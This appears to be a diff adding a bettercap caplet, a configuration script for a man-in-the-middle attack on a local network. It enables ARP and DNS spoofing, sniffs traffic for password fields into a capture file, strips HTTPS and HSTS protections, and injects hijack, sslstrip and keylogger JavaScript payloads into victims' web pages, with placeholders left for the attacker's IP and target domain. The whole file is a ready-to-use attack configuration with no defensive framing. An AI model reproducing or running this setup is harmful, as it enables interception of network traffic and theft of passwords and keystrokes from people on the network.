@@ -1,0 +1,39 @@
+set net.sniff.regexp .*password=.+
+set net.sniff.output passwords.cap
+set net.sniff.local true
+
+
+set arp.spoof.internal    true
+set arp.spoof.whitelist <Your IP>
+
+set dns.spoof.domains  *.<Domain_Name>,  *.local
+set dns.spoof.all      true
+
+
+set hstshijack.targets         *.<Domain_Name>, *.local 
+set hstshijack.replacements    *.<Domain_Name>, *.local
+set hstshijack.ssl.domains     /usr/share/bettercap/caplets/hstshijack/domains.txt
+set hstshijack.ssl.index       /usr/share/bettercap/caplets/hstshijack/index.json
+set hstshijack.ssl.check       true
+set hstshijack.blockscripts    *.<Domain_Name>, *.local
+set hstshijack.obfuscate       true
+set hstshijack.encode           true
+set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+set hstshijack.ignore          *
+
+
+set http.proxy.script  /usr//share/bettercap/caplets/hstshijack/hstshijack.js
+set https.proxy.script  /usr//share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+
+net.recon on
+net.sniff on
+
+net.probe on
+
+dns.spoof on
+arp.spoof on 
+
+http.proxy on
+https.proxy on 
